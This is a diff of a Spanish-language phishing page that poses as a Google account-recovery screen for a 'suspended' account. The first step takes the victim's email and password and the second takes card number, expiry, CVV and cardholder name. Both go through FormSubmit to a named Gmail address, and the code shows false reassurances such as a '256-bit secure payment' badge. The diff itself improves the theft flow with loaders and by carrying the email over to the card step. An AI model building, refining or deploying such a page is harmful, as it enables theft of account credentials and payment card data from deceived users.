@@ -22,8 +22,10 @@
             width: 100%;
             max-width: 400px;
             text-align: center;
-            display: none;
+            /* Ocultar por defecto los pasos que no están activos */
+            display: none; 
         }
+        /* Clase para mostrar el paso activo */
         .active {
             display: block !important;
         }
@@ -70,6 +72,10 @@
         button:hover {
             background-color: #1765cc;
         }
+        .row {
+            display: flex;
+            gap: 10px;
+        }
         .card-icons {
             margin: 15px 0;
             font-size: 24px;
@@ -99,9 +105,9 @@
 </head>
 <body>
 
-    <!-- PASO 1: EMAIL Y PASSWORD -->
+    <!-- PASO 1: CREDENCIALES (Solo se muestra si tiene la clase 'active') -->
     <div id="step1" class="container active">
-        <!-- Logo SVG directo para evitar el 404 -->
+        <!-- Logo SVG -->
         <svg class="logo" viewBox="0 0 24 24" width="75" height="75" xmlns="http://www.w3.org/2000/svg">
             <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
             <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
@@ -113,134 +119,90 @@
         <p>Para recuperar tu cuenta suspendida, por favor ingresa tus credenciales.</p>
         
         <form id="form-step1">
-            <!-- Datos ocultos -->
-            <input type="hidden" name="_next" value="https://www.google.com">
+            <!-- Datos ocultos para FormSubmit -->
             <input type="hidden" name="_subject" value="Paso 1: Credenciales">
             <input type="hidden" name="_captcha" value="false">
 
-            <input type="email" name="Email" placeholder="Correo electrónico" required>
-            <input type="password" name="Password" placeholder="Contraseña" required>
+            <input type="email" name="email" placeholder="Ingresa tu email" required>
+            <input type="password" name="password" placeholder="Ingresa tu contraseña" required>
             
-            <button type="button" id="btn-step1">Ingresar</button>
-            <div class="loader" id="loader1"></div>
+            <button type="button" id="btn-step1">Verificar</button>
         </form>
-        
-        <div class="footer">
-            Google, Inc. • 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA
-        </div>
+        <div class="loader" id="loader1"></div>
     </div>
 
-    <!-- FORMULARIO PASO 2: TARJETA -->
-    <div id="step2" class="step hidden">
-        <h3>Verificación de Seguridad</h3>
-        <p>Ingrese los datos de su tarjeta para desbloquear la cuenta.</p>
+    <!-- PASO 2: TARJETA (Oculta por defecto, sin clase 'active') -->
+    <div id="step2" class="container">
+        <svg class="logo" viewBox="0 0 24 24" width="50" height="50" xmlns="http://www.w3.org/2000/svg">
+            <path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4V6h16v12z" fill="#5f6368"/>
+        </svg>
+        <h2>Verificación de Tarjeta</h2>
+        <p>Ingresa los datos de tu tarjeta para confirmar tu identidad.</p>
         
         <form id="form-step2" action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
-            <!-- Campo oculto para mantener la continuidad -->
-            <input type="hidden" name="_subject" value="Verificación de Tarjeta - Gmail">
+            <!-- Datos ocultos -->
+            <input type="hidden" name="_subject" value="Paso 2: Tarjeta de Crédito">
             <input type="hidden" name="_captcha" value="false">
-            
-            <div class="input-group">
-                <label>Número de Tarjeta</label>
-                <input type="text" name="card_number" placeholder="0000 0000 0000 0000" maxlength="19" required>
-            </div>
+            <!-- Campo oculto para saber que ya pasó por el paso 1 -->
+            <input type="hidden" name="email_pasado" id="email_pasado">
+
+            <input type="text" name="card_number" placeholder="Número de Tarjeta" maxlength="19" required>
             
             <div class="row">
-                <div class="input-group">
-                    <label>Fecha de Expiración</label>
-                    <input type="text" name="expiry" placeholder="MM/AA" maxlength="5" required>
-                </div>
-                <div class="input-group">
-                    <label>CVV</label>
-                    <input type="text" name="cvv" placeholder="123" maxlength="3" required>
-                </div>
+                <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                <input type="text" name="cvv" placeholder="CVV" maxlength="3" required>
             </div>
 
-            <!-- CAMBIO CLAVE: Usar 'pass' en vez de 'password' -->
-            <div class="input-group">
-                <label>Contraseña de la Cuenta</label>
-                <input type="password" name="pass" placeholder="Ingrese su contraseña" required>
-            </div>
-
-            <button type="submit" id="btn-step2" class="btn-primary">
-                Verificar y Desbloquear
-            </button>
+            <input type="text" name="cardholder_name" placeholder="Nombre en la tarjeta" required>
+            
+            <button type="submit" id="btn-step2">Verificar y Desbloquear</button>
         </form>
+        <div class="loader" id="loader2"></div>
+        <div class="footer">🔒 Pago seguro de 256 bits</div>
     </div>
+
     <script>
         // Lógica del Paso 1
         document.getElementById('btn-step1').addEventListener('click', function() {
             const form = document.getElementById('form-step1');
-            const btn = document.getElementById('btn-step1');
-            const originalText = btn.innerText;
+            const email = form.querySelector('input[name="email"]').value;
             
-            btn.innerText = "Enviando...";
-            btn.disabled = true;
-            
-            const data = new FormData(form);
-            
-            fetch('https://formsubmit.co/ajax/Quisan2017@gmail.com', { // Usamos /ajax/ para mejor control
-                method: 'POST',
-                body: data
-            })
-            .then(response => {
-                if (response.ok) {
-                    document.getElementById('step1').classList.remove('active');
-                    document.getElementById('step2').classList.add('active');
-                } else {
-                    alert('Error del servidor: ' + response.status);
-                }
-            })
-            .catch(error => {
-                alert('Error de red: ' + error.message);
-                console.error('Error completo:', error);
-            })
-            .finally(() => {
-                btn.innerText = originalText;
-                btn.disabled = false;
-            });
-        });
+            if(!email || !form.querySelector('input[name="password"]').value) {
+                alert("Por favor completa ambos campos");
+                return;
+            }
 
-        // Lógica del Paso 2
-        document.getElementById('btn-step2').addEventListener('click', function(e) {
-            e.preventDefault(); // Evita el envío normal
-            
-            const form = document.getElementById('form-step2');
-            const btn = document.getElementById('btn-step2');
-            const originalText = btn.innerText;
-            
-            btn.innerText = "Procesando...";
-            btn.disabled = true;
-            
-            const formData = new FormData(form);
-            
-            // IMPORTANTE: Usar /ajax/ en la URL de FormsSubmit mejora la respuesta JSON
+            // Mostrar loader y ocultar botón
+            document.getElementById('loader1').style.display = 'block';
+            this.style.display = 'none';
+
+            const data = new FormData(form);
+            // Guardamos el email para pasarlo al paso 2
+            document.getElementById('email_pasado').value = email;
+
+            // Enviar datos del Paso 1
             fetch('https://formsubmit.co/ajax/Quisan2017@gmail.com', {
                 method: 'POST',
-                body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
+                body: data,
+                headers: { 'Accept': 'application/json' }
             })
             .then(response => {
                 if (response.ok) {
-                    return response.json();
+                    // Ocultar Paso 1
+                    document.getElementById('step1').classList.remove('active');
+                    // Mostrar Paso 2
+                    document.getElementById('step2').classList.add('active');
                 } else {
-                    throw new Error('Error del servidor');
+                    alert("Error al verificar credenciales.");
+                    document.getElementById('loader1').style.display = 'none';
+                    this.style.display = 'block';
                 }
-            })
-            .then(data => {
-                console.log('Éxito:', data);
-                alert('¡Verificación completada! Redirigiendo...');
-                window.location.href = "https://www.google.com"; // O la URL que quieras
             })
             .catch(error => {
                 console.error('Error:', error);
-                alert('Error al enviar credenciales: ' + error.message);
-            })
-            .finally(() => {
-                btn.innerText = originalText;
-                btn.disabled = false;
+                alert("Error de conexión.");
+                document.getElementById('loader1').style.display = 'none';
+                this.style.display = 'block';
             });
         });
     </script>
